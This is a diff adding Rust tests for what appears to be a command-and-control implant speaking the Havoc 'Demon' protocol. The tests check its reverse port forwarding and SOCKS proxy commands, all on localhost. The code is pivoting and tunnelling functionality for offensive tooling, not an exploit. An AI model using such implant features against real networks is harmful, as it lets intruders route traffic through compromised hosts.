+            read_u32(payload, &mut offset),
+            u32::from(DemonSocketCommand::ReversePortForwardAddLocal)
+        );
+        assert_eq!(read_u32(payload, &mut offset), 1);
+
+        let mut client = tokio::net::TcpStream::connect(("127.0.0.1", bind_port))
+            .await
+            .expect("connect listener");
+        poll_until(&mut state, |state| !state.local_relays.is_empty()).await;
+
+        client.write_all(b"phantom-rportfwd").await.expect("write client");
+        poll_n(&mut state, 10).await;
+        let mut echoed = vec![0_u8; "phantom-rportfwd".len()];
+        tokio::time::timeout(Duration::from_secs(1), client.read_exact(&mut echoed))
+            .await
+            .expect("read timeout")
+            .expect("read echoed");
+        assert_eq!(echoed, b"phantom-rportfwd");
+
+        drop(client);
+        poll_until(&mut state, |state| state.local_relays.is_empty()).await;
+        target_task.await.expect("target task");
+    }
+
+    #[tokio::test]
+    async fn socks_proxy_commands_manage_listener_lifecycle() {
+        let mut add_payload = Vec::new();
+        add_payload.extend_from_slice(&(DemonSocketCommand::SocksProxyAdd as i32).to_le_bytes());
+        add_payload.extend_from_slice(&(u32::from(Ipv4Addr::LOCALHOST) as i32).to_le_bytes());
+        add_payload.extend_from_slice(&0_i32.to_le_bytes());
+
+        let mut state = PhantomState::default();
+        execute(&DemonPackage::new(DemonCommand::CommandSocket, 7, add_payload), &mut state)
+            .await
+            .expect("socks add");
+
+        let callbacks = state.drain_callbacks();
+        let [PendingCallback::Socket { request_id: 7, payload }] = callbacks.as_slice() else {
+            panic!("unexpected callbacks: {callbacks:?}");
+        };
+        let mut offset = 0;
+        assert_eq!(read_u32(payload, &mut offset), u32::from(DemonSocketCommand::SocksProxyAdd));
+        assert_eq!(read_u32(payload, &mut offset), 1);
+        let socket_id = read_u32(payload, &mut offset);
+        assert_ne!(socket_id, 0);
+        assert_eq!(read_u32(payload, &mut offset), u32::from(Ipv4Addr::LOCALHOST));
+        let bound_port = read_u32(payload, &mut offset);
+        assert_ne!(bound_port, 0);
+        assert_eq!(state.socks_proxies.len(), 1);
+
+        let list_payload = (DemonSocketCommand::SocksProxyList as i32).to_le_bytes().to_vec();
+        execute(&DemonPackage::new(DemonCommand::CommandSocket, 8, list_payload), &mut state)
+            .await
+            .expect("socks list");
+        let callbacks = state.drain_callbacks();
+        let [PendingCallback::Socket { request_id: 8, payload }] = callbacks.as_slice() else {
+            panic!("unexpected callbacks: {callbacks:?}");
+        };
+        let mut offset = 0;
+        assert_eq!(read_u32(payload, &mut offset), u32::from(DemonSocketCommand::SocksProxyList));
+        assert_eq!(read_u32(payload, &mut offset), socket_id);
+        assert_eq!(read_u32(payload, &mut offset), u32::from(Ipv4Addr::LOCALHOST));
+        assert_eq!(read_u32(payload, &mut offset), bound_port);
+
+        let mut remove_payload = Vec::new();
+        remove_payload
+            .extend_from_slice(&(DemonSocketCommand::SocksProxyRemove as i32).to_le_bytes());
+        remove_payload.extend_from_slice(&socket_id.to_le_bytes());
+        execute(&DemonPackage::new(DemonCommand::CommandSocket, 9, remove_payload), &mut state)
+            .await
+            .expect("socks remove");
+        let callbacks = state.drain_callbacks();
+        let [PendingCallback::Socket { request_id: 9, payload }] = callbacks.as_slice() else {
+            panic!("unexpected callbacks: {callbacks:?}");
+        };
+        let mut offset = 0;
+        assert_eq!(read_u32(payload, &mut offset), u32::from(DemonSocketCommand::SocksProxyRemove));
+        assert_eq!(read_u32(payload, &mut offset), socket_id);
+        assert!(state.socks_proxies.is_empty());
+
+        let mut add_payload = Vec::new();
+        add_payload.extend_from_slice(&(DemonSocketCommand::SocksProxyAdd as i32).to_le_bytes());
+        add_payload.extend_from_slice(&(u32::from(Ipv4Addr::LOCALHOST) as i32).to_le_bytes());
+        add_payload.extend_from_slice(&0_i32.to_le_bytes());
+        execute(&DemonPackage::new(DemonCommand::CommandSocket, 10, add_payload), &mut state)
+            .await
+            .expect("socks add");
+        let _ = state.drain_callbacks();
+
+        let clear_payload = (DemonSocketCommand::SocksProxyClear as i32).to_le_bytes().to_vec();
+        execute(&DemonPackage::new(DemonCommand::CommandSocket, 11, clear_payload), &mut state)
+            .await
+            .expect("socks clear");
+        let callbacks = state.drain_callbacks();
+        let [PendingCallback::Socket { request_id: 11, payload }] = callbacks.as_slice() else {
+            panic!("unexpected callbacks: {callbacks:?}");
+        };
+        let mut offset = 0;
+        assert_eq!(read_u32(payload, &mut offset), u32::from(DemonSocketCommand::SocksProxyClear));
+        assert_eq!(read_u32(payload, &mut offset), 1);
+        assert!(state.socks_proxies.is_empty());
+    }
+
+    #[tokio::test]
+    async fn socks_proxy_relays_connect_and_data() {
+        let target = tokio::net::TcpListener::bind(("127.0.0.1", 0)).await.expect("bind target");
+        let target_port = target.local_addr().expect("target addr").port();
+        let target_task = tokio::spawn(async move {
+            let (mut stream, _) = target.accept().await.expect("accept target");
+            let mut buffer = [0_u8; 32];
+            let read = stream.read(&mut buffer).await.expect("read target");
+            stream.write_all(&buffer[..read]).await.expect("write target");
+        });
+
+        let mut add_payload = Vec::new();
+        add_payload.extend_from_slice(&(DemonSocketCommand::SocksProxyAdd as i32).to_le_bytes());
+        add_payload.extend_from_slice(&(u32::from(Ipv4Addr::LOCALHOST) as i32).to_le_bytes());
+        add_payload.extend_from_slice(&0_i32.to_le_bytes());
+
+        let mut state = PhantomState::default();
+        execute(&DemonPackage::new(DemonCommand::CommandSocket, 12, add_payload), &mut state)
+            .await
+            .expect("socks add");
+        let callbacks = state.drain_callbacks();
+        let [PendingCallback::Socket { payload, .. }] = callbacks.as_slice() else {
+            panic!("unexpected callbacks: {callbacks:?}");
+        };
+        let mut offset = 0;
+        assert_eq!(read_u32(payload, &mut offset), u32::from(DemonSocketCommand::SocksProxyAdd));
+        assert_eq!(read_u32(payload, &mut offset), 1);
+        let _socket_id = read_u32(payload, &mut offset);
+        let _bind_addr = read_u32(payload, &mut offset);
+        let proxy_port = read_u32(payload, &mut offset) as u16;
+
+        let mut client =
+            tokio::net::TcpStream::connect(("127.0.0.1", proxy_port)).await.expect("connect proxy");
+        client.write_all(&[5, 1, 0]).await.expect("write greeting");
+        poll_until(&mut state, |state| !state.socks_clients.is_empty()).await;
+        let mut greeting = [0_u8; 2];
+        tokio::time::timeout(Duration::from_secs(1), client.read_exact(&mut greeting))
+            .await
+            .expect("greeting timeout")
+            .expect("read greeting");
+        assert_eq!(greeting, [5, 0]);
+
+        client
+            .write_all(&[5, 1, 0, 1, 127, 0, 0, 1, (target_port >> 8) as u8, target_port as u8])
+            .await
+            .expect("write connect");
+        poll_until(&mut state, |state| {
+            state
+                .socks_clients
+                .values()
+                .any(|client| matches!(client.state, super::SocksClientState::Relay { .. }))
+        })
+        .await;
+
+        let mut reply = [0_u8; 10];
+        tokio::time::timeout(Duration::from_secs(1), client.read_exact(&mut reply))
+            .await
+            .expect("reply timeout")
+            .expect("read reply");
+        assert_eq!(reply[0..2], [5, 0]);
+
+        client.write_all(b"phantom-socks").await.expect("write payload");
+        poll_n(&mut state, 10).await;
+        let mut echoed = vec![0_u8; "phantom-socks".len()];
+        tokio::time::timeout(Duration::from_secs(1), client.read_exact(&mut echoed))
+            .await
+            .expect("echo timeout")
+            .expect("read echo");
+        assert_eq!(echoed, b"phantom-socks");
+
+        drop(client);
+        poll_until(&mut state, |state| state.socks_clients.is_empty()).await;
+        target_task.await.expect("target task");
     }
 
     #[test]
